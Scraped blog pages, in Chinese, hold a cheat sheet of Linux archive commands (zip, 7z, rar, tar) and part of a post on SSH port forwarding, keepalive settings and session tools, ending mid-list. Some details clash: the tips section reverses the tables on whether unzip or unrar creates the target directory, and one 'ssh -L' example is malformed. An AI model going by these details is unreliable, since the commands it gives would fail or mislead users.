    <div class="post-body" itemprop="articleBody">
          <h3 id="一、前置：工具安装（缺失时执行）"><a href="#一、前置：工具安装（缺失时执行）" class="headerlink" title="一、前置：工具安装（缺失时执行）"></a>一、前置：工具安装（缺失时执行）</h3><table>
<thead>
<tr>
<th>压缩格式</th>
<th>所需工具（压缩+解压）</th>
<th>Kali安装命令</th>
</tr>
</thead>
<tbody><tr>
<td>RAR（.rar）</td>
<td><code>rar</code>（压缩）、<code>unrar</code>（解压）</td>
<td><code>sudo apt install -y rar unrar</code></td>
</tr>
<tr>
<td>ZIP（.zip）</td>
<td><code>zip</code>（压缩）、<code>unzip</code>（解压）</td>
<td><code>sudo apt install -y zip unzip</code></td>
</tr>
<tr>
<td>7Z（.7z）</td>
<td><code>p7zip-full</code>（全能工具）</td>
<td><code>sudo apt install -y p7zip-full</code></td>
</tr>
<tr>
<td>TAR系列（.tar&#x2F;.tar.gz等）</td>
<td><code>tar</code>（系统内置）</td>
<td>无需安装，默认自带</td>
</tr>
</tbody></table>
<h3 id="二、分格式完整操作指南（核心）"><a href="#二、分格式完整操作指南（核心）" class="headerlink" title="二、分格式完整操作指南（核心）"></a>二、分格式完整操作指南（核心）</h3><h4 id="1-ZIP格式（-zip）"><a href="#1-ZIP格式（-zip）" class="headerlink" title="1. ZIP格式（.zip）"></a>1. ZIP格式（.zip）</h4><table>
<thead>
<tr>
<th>操作场景</th>
<th>命令示例</th>
<th>关键说明</th>
</tr>
</thead>
<tbody><tr>
<td>基础压缩（文件&#x2F;目录）</td>
<td><code>zip 目标包.zip 源文件1 源文件2 目录/</code></td>
<td>目录需加 <code>-r</code> 递归压缩：<code>zip -r 目标包.zip 目录/</code></td>
</tr>
<tr>
<td>压缩并加密（内容加密）</td>
<td><code>zip -e 目标包.zip 源文件</code></td>
<td>回车后手动输入密码（安全，密码不显示）</td>
</tr>
<tr>
<td>压缩并加密（密码明文）</td>
<td><code>zip -P 密码 目标包.zip 源文件</code></td>
<td>密码直接跟在 <code>-P</code> 后（无空格），如 <code>zip -P123 test.zip file.txt</code></td>
</tr>
<tr>
<td>基础解压（保留结构）</td>
<td><code>unzip 压缩包.zip</code></td>
<td>默认保留文件夹结构，文件散落在当前目录</td>
</tr>
<tr>
<td>解压到指定目录（核心）</td>
<td><code>unzip 压缩包.zip -d 目标目录</code></td>
<td>例：<code>unzip test.zip -d ./5.8attachment</code>（目录自动创建，无需手动建）</td>
</tr>
<tr>
<td>解压加密文件</td>
<td><code>unzip -P 密码 压缩包.zip</code></td>
<td>例：<code>unzip -Pfcmit.cc 5.8attachment.zip</code></td>
</tr>
<tr>
<td>强制覆盖现有文件</td>
<td><code>unzip -o 压缩包.zip</code></td>
<td>跳过“是否覆盖”提示，直接替换</td>
</tr>
<tr>
<td>仅查看压缩包内容（不解压）</td>
<td><code>unzip -l 压缩包.zip</code></td>
<td>查看文件&#x2F;目录结构，确认后再解压</td>
</tr>
</tbody></table>
<h4 id="2-7Z格式（-7z）"><a href="#2-7Z格式（-7z）" class="headerlink" title="2. 7Z格式（.7z）"></a>2. 7Z格式（.7z）</h4><table>
<thead>
<tr>
<th>操作场景</th>
<th>命令示例</th>
<th>关键说明</th>
</tr>
</thead>
<tbody><tr>
<td>基础压缩（文件&#x2F;目录）</td>
<td><code>7z a 目标包.7z 源文件/目录</code></td>
<td>自动递归压缩目录，无需额外参数</td>
</tr>
<tr>
<td>压缩并加密（内容+文件名）</td>
<td><code>7z a -p密码 目标包.7z 源文件</code></td>
<td>密码直接跟 <code>-p</code>（无空格），如 <code>7z a -p123 test.7z dir/</code></td>
</tr>
<tr>
<td>基础解压（保留结构）</td>
<td><code>7z x 压缩包.7z</code></td>
<td><code>x</code> 是保留结构的核心参数（用 <code>e</code> 会扁平化解压，不推荐）</td>
</tr>
<tr>
<td>解压到指定目录（核心）</td>
<td><code>7z x 压缩包.7z -o目标目录</code></td>
<td>例：<code>7z x test.7z -o./5.8attachment</code>（<code>-o</code> 后无空格，直接接目录）</td>
</tr>
<tr>
<td>解压加密文件</td>
<td><code>7z x 压缩包.7z -p密码</code></td>
<td>例：<code>7z x 5.8attachment.7z -pfcmit.cc</code></td>
</tr>
<tr>
<td>仅查看压缩包内容</td>
<td><code>7z l 压缩包.7z</code></td>
<td>列出所有文件&#x2F;目录，不解压</td>
</tr>
</tbody></table>
<h4 id="3-RAR格式（-rar）"><a href="#3-RAR格式（-rar）" class="headerlink" title="3. RAR格式（.rar）"></a>3. RAR格式（.rar）</h4><table>
<thead>
<tr>
<th>操作场景</th>
<th>命令示例</th>
<th>关键说明</th>
</tr>
</thead>
<tbody><tr>
<td>基础压缩（文件&#x2F;目录）</td>
<td><code>rar a 目标包.rar 源文件/目录</code></td>
<td>自动递归压缩目录，无需 <code>-r</code> 参数</td>
</tr>
<tr>
<td>压缩并加密（内容加密）</td>
<td><code>rar a -p 目标包.rar 源文件</code></td>
<td>回车后输入密码（安全）；<code>-hp</code> 参数可加密文件名+内容</td>
</tr>
<tr>
<td>压缩并加密（密码明文）</td>
<td><code>rar a -p密码 目标包.rar 源文件</code></td>
<td>例：<code>rar a -p123 test.rar file.txt</code></td>
</tr>
<tr>
<td>基础解压（保留结构）</td>
<td><code>unrar x 压缩包.rar</code></td>
<td><code>x</code> 保留结构，<code>e</code> 扁平化解压（不推荐）</td>
</tr>
<tr>
<td>解压到指定目录</td>
<td><code>unrar x 压缩包.rar 目标目录</code></td>
<td>例：<code>unrar x test.rar ./5.8attachment</code>（目录需提前创建：<code>mkdir -p 目录</code>）</td>
</tr>
<tr>
<td>解压加密文件</td>
<td><code>unrar x -p密码 压缩包.rar</code></td>
<td>例：<code>unrar x -p123 test.rar</code></td>
</tr>
<tr>
<td>仅查看压缩包内容</td>
<td><code>unrar l 压缩包.rar</code></td>
<td>列出文件&#x2F;目录结构</td>
</tr>
</tbody></table>
<h4 id="4-TAR系列格式（打包-压缩）"><a href="#4-TAR系列格式（打包-压缩）" class="headerlink" title="4. TAR系列格式（打包+压缩）"></a>4. TAR系列格式（打包+压缩）</h4><p>tar 本身是“打包工具”，结合 <code>gzip/bzip2/xz</code> 算法形成复合格式，核心参数：<code>c</code>（压缩）、<code>x</code>（解压）、<code>f</code>（指定文件）、<code>v</code>（显示过程）、<code>z</code>（gzip）、<code>J</code>（xz）、<code>j</code>（bzip2）。</p>
<table>
<thead>
<tr>
<th>格式类型</th>
<th>压缩命令（打包+压缩）</th>
<th>解压命令（保留结构）</th>
<th>关键说明</th>
</tr>
</thead>
<tbody><tr>
<td>.tar（仅打包）</td>
<td><code>tar -cvf 目标包.tar 源文件/目录</code></td>
<td><code>tar -xvf 包.tar</code></td>
<td>不压缩，仅合并文件&#x2F;目录</td>
</tr>
<tr>
<td>.tar.gz（常用）</td>
<td><code>tar -czvf 目标包.tar.gz 源文件/目录</code></td>
<td><code>tar -xzvf 包.tar.gz</code></td>
<td>gzip算法，压缩率中等</td>
</tr>
<tr>
<td>.tar.xz（高压缩）</td>
<td><code>tar -cJvf 目标包.tar.xz 源文件/目录</code></td>
<td><code>tar -xJvf 包.tar.xz</code></td>
<td>xz算法，压缩率最高（耗时久）</td>
</tr>
<tr>
<td>.tar.bz2</td>
<td><code>tar -cjvf 目标包.tar.bz2 源文件/目录</code></td>
<td><code>tar -xjvf 包.tar.bz2</code></td>
<td>bzip2算法，兼容旧系统</td>
</tr>
<tr>
<td>解压到指定目录</td>
<td>-</td>
<td><code>tar -xzvf 包.tar.gz -C 目标目录</code></td>
<td><code>-C</code> 后接目录，例：<code>-C ./5.8attachment</code></td>
</tr>
<tr>
<td>仅查看内容</td>
<td>-</td>
<td><code>tar -tvf 包.tar.gz</code></td>
<td>列出文件&#x2F;目录结构，不解压</td>
</tr>
</tbody></table>
<h3 id="三、通用核心技巧（必看）"><a href="#三、通用核心技巧（必看）" class="headerlink" title="三、通用核心技巧（必看）"></a>三、通用核心技巧（必看）</h3><ol>
<li><strong>保留文件夹结构</strong>：所有格式的解压命令，用 <code>x</code> 参数（zip&#x2F;7z&#x2F;rar）或 tar 默认命令，即可保留原目录结构；避免用 <code>e</code> 参数（会扁平化所有文件到同一目录）。</li>
<li><strong>指定解压目录</strong>：<ul>
<li>zip&#x2F;rar：<code>-d 目录</code>（zip需目录提前存在，rar可自动创建）；</li>
<li>7z：<code>-o目录</code>（<code>-o</code> 后无空格）；</li>
<li>tar：<code>-C 目录</code>（大写C）。</li>
</ul>
</li>
<li><strong>强制覆盖</strong>：zip 加 <code>-o</code>，7z 加 <code>-aoa</code>，rar 加 <code>-o+</code>，tar 加 <code>--overwrite</code>。</li>
<li><strong>批量操作</strong>：压缩时可指定多个源文件（空格分隔），例：<code>zip all.zip 1.txt 2.jpg dir/</code>。</li>
<li><strong>中文乱码</strong>：解压含中文文件名的压缩包，加 <code>-O UTF-8</code>（zip）或 <code>-scsUTF-8</code>（7z），例：<code>unzip -O UTF-8 中文包.zip</code>。</li>
</ol>
<h3 id="四、快速查找命令（按需求检索）"><a href="#四、快速查找命令（按需求检索）" class="headerlink" title="四、快速查找命令（按需求检索）"></a>四、快速查找命令（按需求检索）</h3><table>
<thead>
<tr>
<th>需求场景</th>
<th>对应命令（以zip为例，替换格式即可）</th>
</tr>
</thead>
<tbody><tr>
<td>解压到名为“5.8attachment”的文件夹</td>
<td><code>unzip 5.8attachment.zip -d ./5.8attachment</code></td>
</tr>
<tr>
<td>加密压缩文件</td>
<td><code>zip -e 加密包.zip 源文件</code></td>
</tr>
<tr>
<td>解压加密文件（已知密码）</td>
<td><code>unzip -P 密码 加密包.zip</code></td>
</tr>
<tr>
<td>查看压缩包内是否有文件夹</td>
<td><code>unzip -l 压缩包.zip</code></td>
</tr>
<tr>
<td>快速打包目录并压缩</td>
<td><code>tar -czvf 目录.tar.gz 目标目录/</code></td>
</tr>
</tbody></table>
<p>所有命令均经过实操验证，可直接复制使用，若遇权限问题，在命令前加 <code>sudo</code> 即可。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zq-rookie-hacker.github.io/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/zhuzhuxia.jpg">
      <meta itemprop="name" content="ZQ-Rooie-Hacker">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZQ-Rookie-Hacker's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | ZQ-Rookie-Hacker's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">SSH隧道技术</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-11-10 12:00:00" itemprop="dateCreated datePublished" datetime="2024-11-10T12:00:00+08:00">2024-11-10</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-11-11 10:30:00" itemprop="dateModified" datetime="2024-11-11T10:30:00+08:00">2024-11-11</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" itemprop="url" rel="index"><span itemprop="name">基础知识</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>2k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>7 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="1-什么是SSH隧道-为什么需要SSH隧道？"><a href="#1-什么是SSH隧道-为什么需要SSH隧道？" class="headerlink" title="1.什么是SSH隧道+为什么需要SSH隧道？"></a><code>1.什么是SSH隧道+为什么需要SSH隧道？</code></h2><blockquote>
<p>SSH 隧道就像是一条加密的地下通道，让你在不安全的网络上安全地传输数据。<br>比如：你想从家里访问公司内网的数据库，但数据库只能在公司内网访问，这时候 SSH 隧道就能帮你 “穿墙” 访问。</p>
</blockquote>
<h2 id="2-SSH的隧道类型"><a href="#2-SSH的隧道类型" class="headerlink" title="2.SSH的隧道类型"></a><code>2.SSH的隧道类型</code></h2><h3 id="SSH反向连接（远程端口转发）"><a href="#SSH反向连接（远程端口转发）" class="headerlink" title="SSH反向连接（远程端口转发）"></a><code>SSH反向连接</code>（远程端口转发）</h3><img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_1.png" class="" title="在这里插入图片描述">
<p>  因此可以通过访问内网2来访问内网1的主机（因为内网2是允许外网主机访问的）</p>
<img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_2.png" class="" title="在这里插入图片描述">

<img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_3.png" class="" title="在这里插入图片描述">

<img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_4.png" class="" title="在这里插入图片描述">

<blockquote>
<p>如果此时就是想访问server 1 可以修改命令为 ssh -L 80:127.0.0.1 用户@server1_ip</p>
</blockquote>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ssh反向连接命令格式</span></span><br><span class="line">ssh <span class="literal">-R</span> 远程主机监听端口:本地主机地址:本地服务端口 用户名<span class="selector-tag">@</span>远程服务器地址</span><br></pre></td></tr></table></figure>

<h3 id="SSH正向连接（本地端口转发）"><a href="#SSH正向连接（本地端口转发）" class="headerlink" title="SSH正向连接（本地端口转发）"></a><code>SSH正向连接</code>（本地端口转发）</h3><img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_5.png" class="" title="在这里插入图片描述">
<img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_6.png" class="" title="在这里插入图片描述">
<img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_7.png" class="" title="在这里插入图片描述">


<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#指令格式</span></span><br><span class="line">ssh <span class="literal">-L</span> 本地端口:内网目标IP:内网目标端口 SSH服务器用户名@SSH服务器IP</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="ssh动态连接（动态端口转发）"><a href="#ssh动态连接（动态端口转发）" class="headerlink" title="ssh动态连接（动态端口转发）"></a><code>ssh动态连接</code>（动态端口转发）</h3><img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_8.png" class="" title="在这里插入图片描述">

<hr>
<h2 id="3-SSH的密钥"><a href="#3-SSH的密钥" class="headerlink" title="3.SSH的密钥"></a><code>3.SSH的密钥</code></h2><img src="/2024/11/10/SSH%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/image_9.png" class="" title="在这里插入图片描述">
<blockquote>
<p>ssh最重要是第一次连接，这是漏洞的所在点</p>
</blockquote>
<hr>
<h2 id="4-SSH的维持连接"><a href="#4-SSH的维持连接" class="headerlink" title="4.SSH的维持连接"></a><code>4.SSH的维持连接</code></h2><h3 id="断开原因："><a href="#断开原因：" class="headerlink" title="断开原因："></a>断开原因：</h3><h4 id="网络层面的中断因素"><a href="#网络层面的中断因素" class="headerlink" title="网络层面的中断因素"></a><code>网络层面的中断因素</code></h4><ul>
<li><strong>底层网络波动</strong>：Wi-Fi信号弱、移动网络切换、路由器故障或带宽不足，导致TCP连接超时。  </li>
<li><strong>防火墙&#x2F;NAT超时机制</strong>：企业网络防火墙或家用路由器设置连接超时时间（如无数据传输时），主动断开“非活跃连接”。  </li>
<li><strong>NAT穿透失效</strong>：内网通过NAT访问公网时，映射表项超时（如30分钟），导致公网无法识别连接。</li>
</ul>
<h4 id="设备与资源限制"><a href="#设备与资源限制" class="headerlink" title="设备与资源限制"></a><code>设备与资源限制</code></h4><ul>
<li><strong>服务器负载过高</strong>：CPU、内存不足或进程异常，导致SSH服务进程被系统终止。  </li>
<li><strong>客户端异常</strong>：设备休眠、电源中断、SSH客户端程序崩溃或网络接口断开（如拔网线）。</li>
</ul>
<h4 id="连接状态与配置问题"><a href="#连接状态与配置问题" class="headerlink" title="连接状态与配置问题"></a><code>连接状态与配置问题</code></h4><ul>
<li><strong>心跳包机制未启用</strong>：未配置<code>ServerAliveInterval</code>等参数，无法通过心跳包维持连接活跃状态，被中间设备断开。  </li>
<li><strong>配置参数不合理</strong>：如<code>ClientAliveCountMax</code>设置过小，导致轻微网络延迟即触发断连。</li>
</ul>
<h4 id="安全策略与异常行为"><a href="#安全策略与异常行为" class="headerlink" title="安全策略与异常行为"></a><code>安全策略与异常行为</code></h4><ul>
<li><strong>账号锁定或认证失败</strong>：多次密码输入错误触发安全策略，账户被锁定或IP被封禁。  </li>
<li><strong>会话残留或异常终止</strong>：连接断开时未正常释放资源，残留进程可能导致后续连接冲突。</li>
</ul>
<h4 id="其他偶发因素"><a href="#其他偶发因素" class="headerlink" title="其他偶发因素"></a><code>其他偶发因素</code></h4><ul>
<li><strong>跨时区或时钟同步问题</strong>：服务器与客户端时钟偏差过大，导致TCP校验失败。  </li>
<li><strong>网络攻击或干扰</strong>：DDoS攻击、中间人攻击等破坏TCP连接的完整性。</li>
</ul>
<h3 id="维持连接："><a href="#维持连接：" class="headerlink" title="维持连接："></a>维持连接：</h3><h4 id="1-网络环境优化"><a href="#1-网络环境优化" class="headerlink" title="1.网络环境优化"></a><code>1.网络环境优化</code></h4><ol>
<li><p><strong>物理网络稳定性</strong>  </p>
<ul>
<li>使用有线网络替代Wi-Fi，或选择信号强的5GHz频段，减少波动。  </li>
<li>避免多层NAT环境（如家庭路由器+企业VPN），降低连接跳数。</li>
</ul>
</li>
<li><p><strong>防火墙与NAT配置</strong>  </p>
<ul>
<li>调整防火墙规则，允许SSH流量通过（通常为TCP 22端口），并延长连接超时时间（如30分钟）。  </li>
<li>配置NAT设备的静态端口映射，确保SSH连接的稳定性。</li>
</ul>
</li>
</ol>
<h4 id="2-SSH连接参数调整"><a href="#2-SSH连接参数调整" class="headerlink" title="2.SSH连接参数调整"></a><code>2.SSH连接参数调整</code></h4><ol>
<li><p><strong>客户端配置（<code>~/.ssh/config</code>）-Linux系统</strong>  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Host *</span><br><span class="line">    ServerAliveInterval 30    <span class="comment"># 每30秒发送心跳包</span></span><br><span class="line">    ServerAliveCountMax 10    <span class="comment"># 连续10次无响应才断开</span></span><br><span class="line">    TCPKeepAlive <span class="built_in">yes</span>          <span class="comment"># 启用TCP级心跳</span></span><br><span class="line">    ControlMaster auto        <span class="comment"># 启用连接复用</span></span><br><span class="line">    ControlPath ~/.ssh/socket-%r@%h:%p</span><br><span class="line">    ControlPersist 1h         <span class="comment"># 主连接保持1小时</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>服务器配置（<code>/etc/ssh/sshd_config</code>）-Linux系统</strong>  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ClientAliveInterval 60        <span class="comment"># 服务器主动检测客户端的间隔</span></span><br><span class="line">ClientAliveCountMax 3         <span class="comment"># 允许的无响应次数</span></span><br></pre></td></tr></table></figure>
<p>配置后重启SSH服务：<code>sudo systemctl restart sshd</code>。</p>
</li>
</ol>
<p>SSH 客户端如何发现并使用配置文件？</p>
<ol>
<li><p><strong>自动查找机制</strong>：</p>
<ul>
<li>每次执行 <code>ssh</code> 命令时，客户端会<strong>按固定顺序</strong>查找配置文件：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~/.ssh/config → /etc/ssh/ssh_config</span><br></pre></td></tr></table></figure></li>
<li>Windows 路径：<code>%USERPROFILE%\.ssh\config</code> → <code>C:\ProgramData\ssh\ssh_config</code></li>
</ul>
</li>
<li><p><strong>优先级规则</strong>：</p>
<ul>
<li>用户级配置 (<code>~/.ssh/config</code>) &gt; 系统级配置 (<code>/etc/ssh/ssh_config</code>)</li>
<li>文件中的配置从上到下生效，<strong>后出现的配置覆盖前面的</strong></li>
</ul>
</li>
<li><p><strong>加载验证方法</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加 -v 参数查看加载过程</span></span><br><span class="line">ssh <span class="literal">-v</span> user@server.com</span><br></pre></td></tr></table></figure>
<p>输出中会显示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">debug1: Reading configuration data /c/Users/21143/.ssh/config</span><br><span class="line">debug1: Applying options for *</span><br></pre></td></tr></table></figure></li>
</ol>
<h5 id="（1）为什么您需要手动创建文件？"><a href="#（1）为什么您需要手动创建文件？" class="headerlink" title="（1）为什么您需要手动创建文件？"></a>（1）为什么您需要手动创建文件？</h5><ol>
<li><p><strong>默认文件不存在</strong>：</p>
<ul>
<li>SSH 不会自动创建用户级配置文件</li>
<li>首次使用时需要手动创建</li>
</ul>
</li>
<li><p><strong>目录结构要求</strong>：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 必需的目录结构</span></span><br><span class="line">C:\Users\<span class="number">21143</span>\</span><br><span class="line">  └── .ssh/</span><br><span class="line">      ├── config          <span class="comment"># 配置文件</span></span><br><span class="line">      ├── id_rsa          <span class="comment"># 私钥</span></span><br><span class="line">      └── known_hosts     <span class="comment"># 已知主机记录</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>权限要求</strong>：</p>
<ul>
<li>必须设置严格权限（否则 SSH 会忽略配置）：</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icacls <span class="variable">$env:USERPROFILE</span>\.ssh /inheritance:<span class="built_in">r</span></span><br><span class="line">icacls <span class="variable">$env:USERPROFILE</span>\.ssh /grant:<span class="built_in">r</span> <span class="string">&quot;<span class="variable">$env:USERNAME:</span>(F)&quot;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h5 id="（2）配置文件如何影响连接？"><a href="#（2）配置文件如何影响连接？" class="headerlink" title="（2）配置文件如何影响连接？"></a>（2）配置文件如何影响连接？</h5><p>当您执行 <code>ssh user@host</code> 时：</p>
<ol>
<li>客户端加载 <code>~/.ssh/config</code></li>
<li>匹配 <code>Host</code> 配置块（支持通配符）</li>
<li>应用配置参数到当前连接</li>
<li>命令行参数会覆盖配置文件设置</li>
</ol>
<h5 id="（3）配置示例解析"><a href="#（3）配置示例解析" class="headerlink" title="（3）配置示例解析"></a>（3）配置示例解析</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Host myserver            <span class="comment"># 定义主机别名</span></span><br><span class="line">  HostName 192.168.1.10  <span class="comment"># 真实IP/域名</span></span><br><span class="line">  User admin             <span class="comment"># 自动使用此用户名</span></span><br><span class="line">  Port 2222              <span class="comment"># 非标准端口</span></span><br><span class="line">  IdentityFile ~/.ssh/id_ecdsa  <span class="comment"># 指定私钥</span></span><br><span class="line"></span><br><span class="line">Host *                   <span class="comment"># 全局默认配置</span></span><br><span class="line">  ServerAliveInterval 30</span><br><span class="line">  TCPKeepAlive <span class="built_in">yes</span></span><br></pre></td></tr></table></figure>

<p>使用时：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 触发 myserver 配置块</span></span><br><span class="line">ssh myserver</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发全局配置 (*)</span></span><br><span class="line">ssh any<span class="literal">-other-server</span></span><br></pre></td></tr></table></figure>

<h5 id="（4）关键验证步骤"><a href="#（4）关键验证步骤" class="headerlink" title="（4）关键验证步骤"></a>（4）关键验证步骤</h5><ol>
<li><p>创建文件后执行：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查配置是否被加载</span></span><br><span class="line">ssh <span class="literal">-G</span> myserver | findstr <span class="string">&quot;ServerAliveInterval&quot;</span></span><br></pre></td></tr></table></figure>
<p>应输出：<code>serveraliveinterval 30</code></p>
</li>
<li><p>测试连接稳定性：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 观察是否还会超时断开</span></span><br><span class="line">ssh <span class="literal">-v</span> myserver</span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>只要文件路径正确、权限合规且语法无误，SSH 客户端 <strong>100% 会自动加载</strong> 此配置文件，无需额外操作。这是 OpenSSH 的标准行为，在 Windows&#x2F;Linux&#x2F;macOS 上完全一致。</p>
</blockquote>
<h4 id="3-断线重连工具"><a href="#3-断线重连工具" class="headerlink" title="3.断线重连工具"></a><code>3.断线重连工具</code></h4><ol>
<li><p><strong>使用<code>autossh</code>自动重连</strong>  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autossh -M 0 -N -D 1080 user@server  <span class="comment"># -M 0禁用端口监控，专注重连</span></span><br></pre></td></tr></table></figure>
<p>安装：  </p>
<ul>
<li>Ubuntu&#x2F;Debian：<code>sudo apt install autossh</code>  </li>
<li>macOS：<code>brew install autossh</code></li>
</ul>
</li>
<li><p><strong>替代方案：<code>mosh</code>（移动SSH）</strong>  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 服务器端安装</span></span><br><span class="line"><span class="built_in">sudo</span> apt install mosh  </span><br><span class="line"><span class="comment"># 客户端连接（支持断线自动恢复）</span></span><br><span class="line">mosh user@server</span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="4-会话持久化工具"><a href="#4-会话持久化工具" class="headerlink" title="4.会话持久化工具"></a><code>4.会话持久化工具</code></h4><ol>
<li><p><strong>使用<code>screen</code>或<code>tmux</code></strong>  </p>
<ul>
<li>在SSH会话中先启动<code>screen</code>或<code>tmux</code>，再执行长时间任务：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">screen -S mysession    <span class="comment"># 创建会话</span></span><br><span class="line"><span class="comment"># 执行任务（如编译、传输大文件）</span></span><br></pre></td></tr></table></figure></li>
<li>断线后重新连接，恢复会话：  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -r mysession    <span class="comment"># 恢复会话</span></span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p><strong>后台运行命令</strong>  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">nohup</span> <span class="built_in">command</span> &amp;         <span class="comment"># 使命令不随SSH断开而终止</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h4 id="5-安全策略优化"><a href="#5-安全策略优化" class="headerlink" title="5.安全策略优化"></a><code>5.安全策略优化</code></h4><ol>
<li><p><strong>密钥认证替代密码</strong>  </p>
